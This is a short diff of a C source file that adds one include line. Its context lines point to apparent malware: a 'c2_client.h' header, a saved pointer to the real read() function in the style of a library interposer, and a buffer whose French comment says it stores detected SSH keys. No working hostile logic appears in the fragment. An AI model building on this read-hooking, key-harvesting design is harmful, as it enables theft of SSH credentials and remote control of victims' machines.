@@ -5,6 +5,7 @@
 #include <string.h>
 #include <errno.h>
 #include "c2_client.h"
+#include "utils.h"  
 
 static ssize_t (*real_read)(int, void*, size_t) = NULL;
 static char ssh_key_buffer[8192];  // Tampon pour stocker les clés SSH détectées
